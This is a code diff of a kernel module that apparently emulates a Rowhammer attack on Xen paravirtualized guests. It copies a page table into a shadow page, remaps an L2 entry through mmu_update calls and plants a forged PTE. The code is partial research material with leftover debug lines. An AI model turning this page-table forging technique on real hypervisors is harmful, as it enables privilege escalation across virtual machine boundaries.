@@ -50,6 +50,11 @@
 
 static void* l2_entry_va;
 
+/* This variable will hold a copy of the PT of the va */
+static unsigned long shadow_va_page;
+static unsigned int my_var = 18012016;
+static unsigned long va = (unsigned long) &my_var;
+
 void page_walk(unsigned long va)
 {
 	pgd_t *pgd;
@@ -152,7 +157,7 @@ int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
 int set_l2_pse_flag(unsigned long va)
 {
 	pmd_t *pmd = get_pmd(va);
-	int rc;
+ 	int rc;
 
 	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd | _PAGE_PSE);
 	if(rc < 0)
@@ -507,20 +512,72 @@ void set_value_from_shadow(unsigned long shadow_va_page, unsigned long va, int v
     *v = val;
 }
 
+void copy_val1_to_shadow(unsigned long shadow_va_page)
+{
+    DEBUG("va - pmd_t (pte_t page frame) - %p - 0x%lx",get_pmd(va), 
+            __machine_addr((void*)get_pmd(va)));
+    DEBUG("va - pte    0x%lx ",(unsigned long) get_pmd(va));
+    DEBUG("va - pte va 0x%lx ",pmd_page_vaddr(*get_pmd(va)));
+    DEBUG("va - pte[0]  0x%lx ",get_pmd(va)->pmd);
+    DEBUG("va - pte_t index - 0x%lx", pte_index(va));
 
+	memcpy((void*)shadow_va_page, (void*)pmd_page_vaddr(*get_pmd(va)), PAGE_SIZE);
 
-/* This variable will hold a copy of the PT of the va */
-static unsigned long shadow_va_page;
-static unsigned int my_var = 18012016;
-static unsigned long va = (unsigned long) &my_var;
+    pte_t *ptr = (pte_t *) shadow_va_page;
+    DEBUG("value in shadow_va_page 0x%lx", *(unsigned long*)shadow_va_page);
+    DEBUG("va -pte_idx(0x%lx) : (addr[pte_idx]) %p -(addr[pte_idx].pte) 0x%lx\n",pte_index(va), 
+            &ptr[pte_index(va)], ptr[pte_index(va)].pte);
+
+    page_walk(shadow_va_page);
+
+    /*
+    DEBUG("my_var %d",my_var);
+    my_var = 30071980;
+    DEBUG("my_var %d",my_var);
+    DEBUG("Print va value from shadow_va_page: %d ", get_value_from_shadow(shadow_va_page, va));
+    int new_val = 23071987;
+    DEBUG("Print va value from shadow_va_page: %d ", new_val);
+    set_value_from_shadow(shadow_va_page, va, 23071987);
+    DEBUG("my_var %d",my_var);
+    */
+}
+    
+
+int replace_l1(unsigned long va, unsigned long l1_page)
+{
+	pte_t *pte_aligned = get_pte(va);
+	pmd_t *pmd = get_pmd(l2_entry_va);
+	int rc;
+
+    /* reestart from here adapt the function from the mapping step */
+
+	// removes RW bit on the aligned_mfn_va's pte
+	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
+	if(rc < 0)
+	{
+		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
+		return -1;
+	}
+
+	// map.
+	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
+	if(rc < 0)
+	{
+		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
+		return -1;
+	}
+
+	return 0;
+}
+
 
 static int __init rh_emul_init(void) {
 
     printk("Loading the rh_emul : %s\n",__FUNCTION__);
 
 	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-    unsigned long *current_tab = (unsigned long*) buff;
-	struct start_info *start_f = (struct start_info *) buff;
+    //unsigned long *current_tab = (unsigned long*) buff;
+	//struct start_info *start_f = (struct start_info *) buff;
 
     /*  
      *  task_struct get_current => current 
@@ -536,46 +593,32 @@ static int __init rh_emul_init(void) {
     DEBUG("Page Walk of va %d - %p", *(int *)va, (void *) va);
     page_walk((unsigned long) va);
 
+    /*
+     *
+     *
+     */
     STEP("1: Allocate a shadow page");
 	// get an aligned mfn writeable
 	shadow_va_page =  __get_free_page(__GFP_ZERO);
 	DEBUG("shadow_va_page = 0x%lx", shadow_va_page);
 	DEBUG("shadow_va_page mfn = 0x%lx", __machine_addr((void *)shadow_va_page));
+    page_walk(shadow_va_page);
 
     STEP("2: copy the L1 from va to the shadow_va_page");
-    DEBUG("pmd_t (pte_t page frame) - %p - 0x%lx",get_pmd(va), __machine_addr((void*)get_pmd(va)));
-    DEBUG("pte    0x%lx ",(unsigned long) get_pmd(va));
-    DEBUG("pte va 0x%lx ",pmd_page_vaddr(*get_pmd(va)));
-    DEBUG("pte[0]  0x%lx ",get_pmd(va)->pmd);
-    DEBUG("pte_t index - 0x%lx", pte_index(va));
+    copy_val1_to_shadow(shadow_va_page);
 
-	memcpy((void*)shadow_va_page, (void*)pmd_page_vaddr(*get_pmd(va)), PAGE_SIZE);
-
-    pte_t *ptr = (pte_t *) shadow_va_page;
-    DEBUG("value in shadow_va_page 0x%lx", *(unsigned long*)shadow_va_page);
-    printk("0x%lx : (addr) %p -(pte) 0x%lx\n",pte_index(va), &ptr[pte_index(va)], 
-            ptr[pte_index(va)].pte);
-
-    /*
-    DEBUG("my_var %d",my_var);
-    my_var = 30071980;
-    DEBUG("my_var %d",my_var);
-    DEBUG("Print va value from shadow_va_page: %d ", get_value_from_shadow(shadow_va_page, va));
-    int new_val = 23071987;
-    DEBUG("Print va value from shadow_va_page: %d ", new_val);
-    set_value_from_shadow(shadow_va_page, va, 23071987);
-    DEBUG("my_var %d",my_var);
-    */
+    STEP("3: Forge the row hammer Flip bit replacing the page");
+    replace_l1(va, shadow_va_page);
 
 
-    STEP("3: create fake pte_t in the the L1 shadow_va_page");
+
+    STEP("4: create fake pte_t in the the L1 shadow_va_page");
     pte_t fake_pte;
-    fake_pte.pte = 0x509a00200;
+    fake_pte.pte = 0x54f536298;
     update_va_pte_in_shadow(shadow_va_page, va, &fake_pte);
 
 
 
-    STEP("4: Forge the row hammer Flip bit replacing the page");
 
 
 /*
